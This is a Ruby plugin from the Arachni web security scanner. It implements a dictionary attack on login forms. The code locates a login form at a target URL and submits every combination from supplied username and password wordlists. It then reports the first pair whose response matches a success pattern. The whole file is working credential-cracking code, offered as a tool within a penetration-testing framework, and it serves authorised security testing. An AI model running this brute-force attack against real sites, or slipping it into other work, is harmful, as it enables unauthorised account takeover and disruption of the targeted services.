=begin
                  Arachni
  Copyright (c) 2010 Tasos "Zapotek" Laskos <tasos.laskos@gmail.com>

  This is free software; you can copy and distribute and modify
  this program under the term of the GPL v2.0 License
  (See LICENSE file for details)

=end

module Arachni
module Plugins

#
# @author: Tasos "Zapotek" Laskos
#                                      <tasos.laskos@gmail.com>
#                                      <zapotek@segfault.gr>
# @version: 0.1
#
class FormDicattack < Arachni::Plugin::Base

    attr_accessor :http

    #
    # @param    [Arachni::Framework]    framework
    # @param    [Hash]        options    options passed to the plugin
    #
    def initialize( framework, options )
        @framework = framework
        @options   = options
    end

    def prepare
        @url     = @framework.opts.url.to_s
        @users   = File.read( @options['userlist'] ).split( "\n" )
        @passwds = File.read( @options['passwdlist'] ).split( "\n" )
        @user_field   = @options['username_field']
        @passwd_field = @options['password_field']
        @verifier     = Regexp.new( @options['login_verifier'] )

        @parser = Arachni::Parser.new( @framework.opts )

        # we need to declare this in order to pass ourselves
        # as the auditor to the form later in order to submit it.
        @http = @framework.http
    end

    def run( )

        if !form = login_form
            print_error( 'Could not find a form suiting the provided params at: ' +
                @url )
            return
        end

        name = form.raw['attrs']['name'] ? form.raw['attrs']['name'] : '<n/a>'
        print_status( "Found log-in form with name: "  + name )

        print_status( "Building the request queue..." )

        total_req = @users.size * @passwds.size
        print_status( "Number of requests to be transmitted: #{total_req}" )

        # register us as the auditor
        form.auditor( self )
        @users.each {
            |user|
            @passwds.each {
                |pass|

                params = {
                    @user_field     => user,
                    @passwd_field   => pass
                }

                # merge the input fields of the form with our own params
                form.auditable.merge!( params.dup )
                form.submit.on_complete {
                    |res|

                    print_status( "#{@user_field}: '#{res.request.params[@user_field]}'" +
                        " -- #{@passwd_field}: '#{res.request.params[@passwd_field]}'" )

                    next if !res.body.match( @verifier )

                    print_ok( "Found a match. #{@user_field}: '#{res.request.params[@user_field]}'" +
                        " -- #{@passwd_field}: '#{res.request.params[@passwd_field]}'" )
                    exit
                }

            }
        }

        print_status( "Waiting for the requests to complete..." )
        @http.run
        print_error( "Couldn't find a match." )
        exit

    end

    def login_form
        # grab the page containing the login form
        res  = @http.get( @url, :async => false ).response

        # parse the response as a Page object
        page = @parser.run( @url, res.body, res.headers_hash )

        # find the login form
        form = nil
        page.forms.each {
            |cform|
            form = cform if login_form?( cform )
        }

        return form
    end


    def login_form?( form )
        avail    = form.auditable.keys
        provided = [ @user_field, @passwd_field ]

        provided.each {
            |name|
            return false if !avail.include?( name )
        }

        return true
    end


    def self.info
        {
            :name           => 'Form dictionary attacker',
            :description    => %q{Uses wordlists to crack login forms.
                It will exit the system once it finishes.},
            :author         => 'Tasos "Zapotek" Laskos <tasos.laskos@gmail.com>',
            :version        => '0.1',
            :options        => [
                # Arachni::OptUrl.new( 'url', [ true, 'URL of the form.' ] ),
                Arachni::OptPath.new( 'userlist', [ true, 'File with a list of usernames (newline separated).' ] ),
                Arachni::OptPath.new( 'passwdlist', [ true, 'File with a list of passwords (newline separated).' ] ),
                Arachni::OptString.new( 'username_field', [ true, 'The name of the username form field.'] ),
                Arachni::OptString.new( 'password_field', [ true, 'The name of the password form field.'] ),
                Arachni::OptString.new( 'login_verifier', [ true, 'A string that will be used to verify a successful login.
                    For example, if a logout link only appears when a user is logged in then it can be a perfect choice.'] ),
            ]
        }
    end

end

end
end
